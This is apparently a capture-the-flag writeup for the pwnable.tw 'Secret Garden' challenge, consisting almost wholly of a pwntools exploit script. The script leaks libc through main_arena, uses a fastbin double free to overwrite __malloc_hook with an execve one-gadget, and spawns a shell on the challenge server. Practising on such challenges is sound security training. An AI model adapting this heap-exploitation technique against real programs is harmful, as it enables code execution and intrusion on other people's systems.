---
title: Secret Garden writeup
date: 2025-02-14T16:52:32+03:00
draft: false
toc: false
images:
tags:
  - heap
  - tw
---

## Exploit:

```py
#!/usr/bin/env python3

from pwn import *
import warnings

exe = ELF("secretgarden_patched", checksec=False)
libc = ELF("libc.so.6")
ld = ELF("./ld-2.23.so")

context.terminal = ["tmux", "splitw", "-h"]
warnings.filterwarnings("ignore", category=BytesWarning)
context.binary = exe

gs = '''
continue
'''

if args.LOCAL:
    r = process([exe.path])
elif args.GDB:
    r = gdb.debug([exe.path], gs)
else:
    r = remote("chall.pwnable.tw", 10203)

def raise_flower(num, name, color):
    r.sendlineafter(b"Your choice : ", "1")
    r.sendlineafter(b"name :", str(num))
    r.sendlineafter(b" flower :", name)
    r.sendlineafter(b" flower :", str(color))

def visit():
    r.sendlineafter(b"Your choice : ", "2")

def remove_flower(idx):
    r.sendlineafter(b"Your choice : ", "3")
    r.sendlineafter(b"garden:", str(idx))

def clean_garden():
    r.sendlineafter(b"Your choice : ", "4")
    


#########################exploit###########################
execve = 0xef6c4

mainoffset = libc.sym.main_arena
print("main arena offset from libc: " + hex(mainoffset))

# leak libc
raise_flower(144, 'A', "daniel")

raise_flower(6, "", 'ido')
remove_flower(0)
raise_flower(0, "", "kaki")

visit()
r.recvuntil(b'Name of the flower[2] :')
main_arena = u64(r.recv(6).ljust(8, b'\x00')) - 88
libc = main_arena - mainoffset
log.success("LIBC: " + hex(libc))
malloc_hook = libc + 0x3c3b10
gadget = libc + execve
print(">>> GADGET: " + str(gadget))
raise_flower(6 ,'first', 'blue')

# trigger double free

raise_flower(0x65, 'first', 'blue') # index 4
raise_flower(0x65, 'second', 'red') # inedx 5
remove_flower(4)
remove_flower(5)
remove_flower(4) 
print(">>>>> malloc hook: "+ str(hex(malloc_hook-0x23)))
raise_flower(0x65, p64(malloc_hook - 0x23), "asd")
raise_flower(0x65, "asd", "asd")
raise_flower(0x65, "asd", "asd")
raise_flower(0x65, b'A' * 0x13 + p64(gadget), "asd")
log.success("overwrote hook")
remove_flower(9)

r.interactive()
```